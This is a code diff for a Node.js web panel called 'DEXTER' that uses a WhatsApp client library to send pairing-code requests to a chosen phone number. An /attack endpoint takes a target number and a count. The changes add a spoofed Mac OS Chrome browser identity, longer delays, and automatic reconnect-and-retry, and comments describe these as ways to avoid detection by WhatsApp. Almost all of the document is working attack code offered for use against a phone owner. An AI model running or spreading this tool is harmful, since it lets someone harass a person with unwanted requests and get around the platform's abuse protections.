@@ -8,45 +8,53 @@ const PORT = process.env.PORT || 8000;
 
 app.use(express.static('public'));
 
-app.get('/attack', async (req, res) => {
-    const target = req.query.num;
-    const count = parseInt(req.query.count) || 5;
-
-    if (!target) return res.status(400).json({ error: "අංකය ඇතුළත් කරන්න!" });
-
-    console.log(`[DEXTER] Attack request for: ${target} | Count: ${count}`);
-
-    // ප්‍රහාරය පසුබිමෙන් පටන් ගමු
-    startAttack(target, count);
-    
-    res.json({ status: "Success", message: `Attack started on ${target}` });
-});
-
 async function startAttack(target, count) {
-    const { state } = await useMultiFileAuthState('temp_session');
+    // Session දත්ත මතක තබා ගැනීමට
+    const { state, saveCreds } = await useMultiFileAuthState('dexter_session');
     
-    const sock = makeWASocket({
+    let sock = makeWASocket({
         auth: state,
         logger: pino({ level: 'silent' }),
-        printQRInTerminal: false
+        printQRInTerminal: false,
+        // සාමාන්‍ය පරිගණකයකින් එන බව පෙන්වීමට
+        browser: ["Mac OS", "Chrome", "10.15.7"]
     });
+
+    sock.ev.on('creds.update', saveCreds);
 
     for (let i = 0; i < count; i++) {
         try {
-            // Pairing code ඉල්ලීම
-            await sock.requestPairingCode(target.replace(/[^0-9]/g, ''));
-            console.log(`[DEXTER] ${i+1} Request sent to ${target}`);
+            // WhatsApp එකට අහු නොවී ඉන්න තත්පර 20ක විවේකයක්
+            await delay(20000); 
             
-            // වැදගත්: වට්සැප් එකට අහු නොවෙන්න පොඩි වෙලාවක් ඉමු
-            await delay(5000); 
+            await sock.requestPairingCode(target.replace(/[^0-9]/g, ''));
+            console.log(`[DEXTER] SUCCESS: ${i + 1} Payload sent to ${target}`);
+            
         } catch (e) {
-            console.log(`[ERROR] ${e.message}`);
+            console.log(`[RECONNECTING] Connection closed. Restarting link...`);
+            // කනෙක්ෂන් එක ගියොත් ආයෙත් Socket එක පණගන්වන්න
+            sock = makeWASocket({
+                auth: state,
+                logger: pino({ level: 'silent' }),
+                browser: ["Mac OS", "Chrome", "10.15.7"]
+            });
+            i--; // අසාර්ථක වූ රවුම් එක ආයෙත් කරන්න
         }
     }
 }
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+app.get('/attack', (req, res) => {
+    const target = req.query.num;
+    const count = parseInt(req.query.count) || 10;
+
+    if (!target) return res.status(400).json({ error: "Target missing!" });
+
+    startAttack(target, count);
+    res.json({ status: "Injected", target: target });
 });
 
-app.listen(PORT, () => console.log(`DEXTER Panel Live on port ${PORT}`));
+app.get('/', (req, res) => {
+    res.sendFile(path.join(process.cwd(), 'index.html'));
+});
+
+app.listen(PORT, () => console.log(`DEXTER Neural Panel running on ${PORT}`));
